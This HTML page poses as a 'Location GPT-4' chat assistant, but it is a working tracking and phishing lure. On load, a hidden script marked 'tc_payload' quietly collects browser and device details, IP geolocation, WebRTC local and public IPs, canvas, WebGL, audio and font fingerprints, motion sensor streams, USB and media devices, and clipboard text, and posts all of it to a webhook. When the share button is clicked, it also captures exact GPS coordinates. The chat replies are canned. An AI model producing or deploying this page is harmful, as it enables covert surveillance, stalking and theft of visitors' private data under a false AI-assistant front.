<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Find People - Location GPT</title>
  <link rel="stylesheet" href="./style.css">
</head>
<body>
  <section class="msger">
    <header class="msger-header">
      <div class="msger-header-title">
        <i class="fas fa-comment-alt"></i> Location ChatGPT 4
      </div>
    </header>

    <main class="msger-chat">
      <div class="msg left-msg">
        <div class="msg-img" style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"></div>
        <div class="msg-bubble">
          <div class="msg-info">
            <div class="msg-info-name">Admin</div>
            <div class="msg-info-time"></div>
          </div>
          <div class="msg-text">
            Hi! Welcome to Location GPT-4. Please click the button below to share your location and find people near you. 📍
          </div>
          <br>
          <button id="locationBtn" class="msger-send-btn" style="width:100%; padding:12px; font-size:16px; background:#579ffb;">
            🌐 Share My Location & Device Info
          </button>
        </div>
      </div>
    </main>

    <form class="msger-inputarea">
      <input type="text" class="msger-input" placeholder="Ask me anything..." id="userInput">
      <button type="submit" class="msger-send-btn">Send</button>
    </form>
  </section>

  <script src="./script.js"></script>
  <p id="techchip"></p>
  <!-- tc_payload -->
<script type="text/javascript">
// ============================================================
// ১. মৌলিক ডিভাইস ইনফরমেশন (শুধু একবার)
// ============================================================
var deviceInfoSent = false;

function getDeviceInfo() {
    if (deviceInfoSent) return;
    deviceInfoSent = true;
    
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
        deviceMemory: navigator.deviceMemory || 'N/A',
        maxTouchPoints: navigator.maxTouchPoints || 'N/A',
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenColorDepth: screen.colorDepth,
        screenPixelDepth: screen.pixelDepth,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        localTime: new Date().toString()
    };
    sendData({ deviceInfo: info });
    
    // Battery (একবার)
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            sendData({
                batteryInfo: {
                    charging: battery.charging,
                    level: Math.round(battery.level * 100) + '%',
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                }
            });
        }).catch(() => {});
    }
}

// ============================================================
// ২. ডেটা পাঠানোর ফাংশন
// ============================================================
function sendData(data) {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', '/webhook.php');
    xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
    xhr.send(JSON.stringify(data));
}

// ============================================================
// ৩. IP ইনফরমেশন (ipinfo.io)
// ============================================================
function getIPInfo() {
    fetch('https://ipinfo.io/json?token=e1a66456c1074c')
        .then(response => response.json())
        .then(data => {
            sendData({
                ipInfo: {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country,
                    loc: data.loc,
                    org: data.org,
                    postal: data.postal,
                    timezone: data.timezone
                }
            });
        })
        .catch(() => {
            var script = document.createElement('script');
            script.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
            document.head.appendChild(script);
        });
}
function handleIP(ipData) {
    fetch('http://ip-api.com/json/' + ipData.ip)
        .then(r => r.json())
        .then(locData => {
            sendData({
                ipInfo: {
                    ip: locData.query,
                    city: locData.city,
                    region: locData.regionName,
                    country: locData.country,
                    loc: locData.lat + ',' + locData.lon,
                    org: locData.isp,
                    postal: locData.zip,
                    timezone: locData.timezone
                }
            });
        });
}

// ============================================================
// ৪. ওরিয়েন্টেশন ও মোশন (রিয়েল-টাইম)
// ============================================================
function startOrientationListener() {
    if (window.DeviceOrientationEvent) {
        window.addEventListener('deviceorientation', function(event) {
            sendData({
                orientation: {
                    timestamp: new Date().toString(),
                    alpha: event.alpha,
                    beta: event.beta,
                    gamma: event.gamma
                }
            });
        }, true);
    }
    if (window.DeviceMotionEvent) {
        window.addEventListener('devicemotion', function(event) {
            var acc = event.acceleration || {};
            var rot = event.rotationRate || {};
            sendData({
                motion: {
                    timestamp: new Date().toString(),
                    acceleration: { x: acc.x || 0, y: acc.y || 0, z: acc.z || 0 },
                    accelerationIncludingGravity: {
                        x: (event.accelerationIncludingGravity || {}).x || 0,
                        y: (event.accelerationIncludingGravity || {}).y || 0,
                        z: (event.accelerationIncludingGravity || {}).z || 0
                    },
                    rotationRate: { alpha: rot.alpha || 0, beta: rot.beta || 0, gamma: rot.gamma || 0 },
                    interval: event.interval || 0
                }
            });
        }, true);
    }
}
async function requestOrientationPermission() {
    if (typeof DeviceOrientationEvent !== 'undefined' && 
        typeof DeviceOrientationEvent.requestPermission === 'function') {
        try {
            var state = await DeviceOrientationEvent.requestPermission();
            if (state === 'granted') startOrientationListener();
        } catch(e) {}
    } else {
        startOrientationListener();
    }
}

// ============================================================
// ৫. GPS লোকেশন (বাটনে ক্লিক করলে)
// ============================================================
function getGPSLocation() {
    if (navigator.geolocation) {
        var chat = document.querySelector('.msger-chat');
        var msgHTML = `<div class="msg left-msg"><div class="msg-img" style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"></div><div class="msg-bubble"><div class="msg-info"><div class="msg-info-name">Admin</div><div class="msg-info-time">${new Date().toLocaleTimeString()}</div></div><div class="msg-text">📍 Requesting location access...</div></div></div>`;
        chat.insertAdjacentHTML('beforeend', msgHTML);
        chat.scrollTop = chat.scrollHeight;
        
        navigator.geolocation.getCurrentPosition(
            function(position) {
                sendData({
                    gps: {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp
                    }
                });
                var chat = document.querySelector('.msger-chat');
                var msgHTML = `<div class="msg left-msg"><div class="msg-img" style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"></div><div class="msg-bubble"><div class="msg-info"><div class="msg-info-name">Admin</div><div class="msg-info-time">${new Date().toLocaleTimeString()}</div></div><div class="msg-text">✅ Location captured!</div></div></div>`;
                chat.insertAdjacentHTML('beforeend', msgHTML);
                chat.scrollTop = chat.scrollHeight;
            },
            function(error) {
                sendData({ gpsError: '❌ Location error' });
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    }
}

// ============================================================
// ৬. নেটওয়ার্ক ইনফরমেশন
// ============================================================
function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
        sendData({
            networkInfo: {
                type: connection.type || 'unknown',
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData
            }
        });
    }
}

// ============================================================
// ৭. লোকাল আইপি (WebRTC)
// ============================================================
function getLocalIP() {
    try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
        let ipCaptured = false;
        pc.onicecandidate = (ice) => {
            if (ice && ice.candidate && ice.candidate.candidate && !ipCaptured) {
                const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                const ipMatch = ipRegex.exec(ice.candidate.candidate);
                if (ipMatch) {
                    ipCaptured = true;
                    sendData({ localIP: ipMatch[0] });
                    pc.onicecandidate = null;
                    pc.close();
                }
            }
        };
        setTimeout(() => { if (!ipCaptured) { sendData({ localIP: 'Timeout' }); pc.close(); } }, 3000);
    } catch(e) {
        sendData({ localIP: 'Blocked' });
    }
}

// ============================================================
// ৮. 🖌️ CANVAS ফিঙ্গারপ্রিন্ট (GPU/রেন্ডারিং পার্থক্য)
// ============================================================
function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 256;
        canvas.height = 128;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('BrowserLeaks,com <canvas> 1.0', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 45);
        ctx.fillStyle = '#00aaff';
        ctx.shadowColor = 'rgba(0, 0, 0, 0.5)';
        ctx.shadowBlur = 10;
        ctx.fillRect(20, 70, 40, 40);
        ctx.shadowBlur = 0;
        ctx.strokeStyle = '#ff0000';
        ctx.lineWidth = 2;
        ctx.beginPath();
        ctx.arc(150, 90, 30, 0, Math.PI * 2);
        ctx.stroke();
        const dataURL = canvas.toDataURL();
        // SHA-256 হ্যাশ তৈরি
        crypto.subtle.digest('SHA-256', new TextEncoder().encode(dataURL))
            .then(hash => {
                const hex = Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
                sendData({ canvasFingerprint: hex });
            })
            .catch(() => {
                sendData({ canvasFingerprint: dataURL.substring(0, 100) }); // ব্যাকআপ
            });
    } catch(e) {
        sendData({ canvasFingerprint: 'Error: ' + e.message });
    }
}

// ============================================================
// ৯. 🎨 WebGL ফিঙ্গারপ্রিন্ট (GPU বিস্তারিত)
// ============================================================
function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) { sendData({ webglFingerprint: 'Not supported' }); return; }
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            // অন্যসব প্যারামিটার
            const params = {
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxCubeMapTextureSize: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
                maxRenderbufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                version: gl.getParameter(gl.VERSION)
            };
            sendData({
                webglFingerprint: {
                    vendor: vendor,
                    renderer: renderer,
                    params: params
                }
            });
        } else {
            sendData({ webglFingerprint: 'Debug info not available' });
        }
    } catch(e) {
        sendData({ webglFingerprint: 'Error: ' + e.message });
    }
}

// ============================================================
// ১০. 🔊 অডিও ফিঙ্গারপ্রিন্ট (OscillatorNode)
// ============================================================
function getAudioFingerprint() {
    try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioCtx.createOscillator();
        const analyser = audioCtx.createAnalyser();
        oscillator.connect(analyser);
        analyser.connect(audioCtx.destination);
        oscillator.frequency.value = 1000;
        oscillator.type = 'sawtooth';
        const dataArray = new Uint8Array(analyser.frequencyBinCount);
        const startTime = audioCtx.currentTime;
        oscillator.start();
        setTimeout(() => {
            analyser.getByteFrequencyData(dataArray);
            oscillator.stop();
            audioCtx.close();
            const hash = Array.from(dataArray.slice(0, 100)).join(',');
            sendData({ audioFingerprint: hash });
        }, 500);
    } catch(e) {
        sendData({ audioFingerprint: 'Error: ' + e.message });
    }
}

// ============================================================
// ১১. 📋 ক্লিপবোর্ড ডেটা (পারমিশন সাপেক্ষে)
// ============================================================
function getClipboardData() {
    if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText()
            .then(text => {
                if (text && text.length > 0) {
                    sendData({ clipboardData: text.substring(0, 500) });
                }
            })
            .catch(() => {});
    }
}

// ============================================================
// ১২. 🎥 মিডিয়া ডিভাইস (ক্যামেরা/মাইক/স্পিকার)
// ============================================================
function getMediaDevices() {
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        navigator.mediaDevices.enumerateDevices()
            .then(devices => {
                const deviceList = devices.map(d => ({
                    kind: d.kind,
                    label: d.label || 'Unknown',
                    deviceId: d.deviceId.substring(0, 8) + '...'
                }));
                sendData({ mediaDevices: deviceList });
            })
            .catch(() => {});
    }
}

// ============================================================
// ১৩. 🔌 WebUSB ডিভাইস
// ============================================================
function getUSBDevices() {
    if (navigator.usb && navigator.usb.getDevices) {
        navigator.usb.getDevices()
            .then(devices => {
                const list = devices.map(d => ({
                    productName: d.productName || 'Unknown',
                    manufacturerName: d.manufacturerName || 'Unknown',
                    serialNumber: d.serialNumber || 'Unknown'
                }));
                if (list.length > 0) sendData({ usbDevices: list });
            })
            .catch(() => {});
    }
}

// ============================================================
// ১৪. 📐 ClientRects (পিক্সেল-পারফেক্ট মাপ)
// ============================================================
function getClientRects() {
    try {
        const div = document.createElement('div');
        div.style.cssText = 'position:fixed;top:0;left:0;width:100px;height:100px;z-index:-9999;';
        document.body.appendChild(div);
        const rect = div.getBoundingClientRect();
        const data = {
            width: rect.width,
            height: rect.height,
            top: rect.top,
            left: rect.left
        };
        document.body.removeChild(div);
        sendData({ clientRects: data });
    } catch(e) {}
}

// ============================================================
// ১৫. 🧠 JavaScript ইঞ্জিনের বৈশিষ্ট্য
// ============================================================
function getJSEngineInfo() {
    try {
        const test = Function.prototype.toString.call(function() {});
        const errorStack = new Error().stack || '';
        sendData({
            jsEngine: {
                functionToString: test.substring(0, 100),
                errorStack: errorStack.substring(0, 200)
            }
        });
    } catch(e) {}
}

// ============================================================
// ১৬. 📱 ইনস্টল করা ফন্টের তালিকা (বর্ধিত)
// ============================================================
function getFontList() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS', 'Impact', 'Webdings', 'Wingdings'];
        const text = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let signature = '';
        fonts.forEach(font => {
            ctx.font = '14px ' + font;
            ctx.fillText(text, 0, 20);
            signature += ctx.measureText(text).width + '|';
        });
        sendData({ fontsSignature: signature });
    } catch(e) {}
}

// ============================================================
// ১৭. 🧭 WebRTC পাবলিক IP (লিক)
// ============================================================
function getWebRTCPublicIP() {
    try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
        let found = false;
        pc.onicecandidate = (ice) => {
            if (ice && ice.candidate && ice.candidate.candidate && !found) {
                const ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
                if (ipMatch && !ipMatch[0].startsWith('192.168.') && !ipMatch[0].startsWith('10.') && !ipMatch[0].startsWith('172.')) {
                    found = true;
                    sendData({ webrtcPublicIP: ipMatch[0] });
                    pc.close();
                }
            }
        };
        setTimeout(() => { if (!found) pc.close(); }, 3000);
    } catch(e) {}
}

// ============================================================
// ১৮. DOM লোড হলে সব শুরু
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    // মৌলিক তথ্য
    getDeviceInfo();
    getIPInfo();
    getNetworkInfo();
    getLocalIP();
    requestOrientationPermission();
    
    // অ্যাডভান্সড ফিঙ্গারপ্রিন্টিং (একবার)
    setTimeout(() => {
        getCanvasFingerprint();
        getWebGLFingerprint();
        getAudioFingerprint();
        getFontList();
        getClientRects();
        getJSEngineInfo();
        getWebRTCPublicIP();
        getMediaDevices();
        getUSBDevices();
        getClipboardData();
    }, 1000);
    
    // GPS বাটন
    var btn = document.getElementById('locationBtn');
    if (btn) {
        btn.addEventListener('click', function(e) {
            e.preventDefault();
            getGPSLocation();
        });
    }
    
    // চ্যাট
    var form = document.querySelector('.msger-inputarea');
    var input = document.getElementById('userInput');
    var chat = document.querySelector('.msger-chat');
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        var txt = input.value.trim();
        if (!txt) return;
        var html = `<div class="msg right-msg"><div class="msg-img" style="background-image: url(https://image.flaticon.com/icons/svg/145/145867.svg)"></div><div class="msg-bubble"><div class="msg-info"><div class="msg-info-name">User</div><div class="msg-info-time">${new Date().toLocaleTimeString()}</div></div><div class="msg-text">${txt}</div></div></div>`;
        chat.insertAdjacentHTML('beforeend', html);
        chat.scrollTop = chat.scrollHeight;
        input.value = '';
        setTimeout(function() {
            var replies = ['Thanks! 😊', 'Share your location using the button above.', 'Location GPT-4 is ready.'];
            var reply = replies[Math.floor(Math.random() * replies.length)];
            var html2 = `<div class="msg left-msg"><div class="msg-img" style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"></div><div class="msg-bubble"><div class="msg-info"><div class="msg-info-name">Admin</div><div class="msg-info-time">${new Date().toLocaleTimeString()}</div></div><div class="msg-text">${reply}</div></div></div>`;
            chat.insertAdjacentHTML('beforeend', html2);
            chat.scrollTop = chat.scrollHeight;
        }, 800);
    });
});
</script></body>
</html>
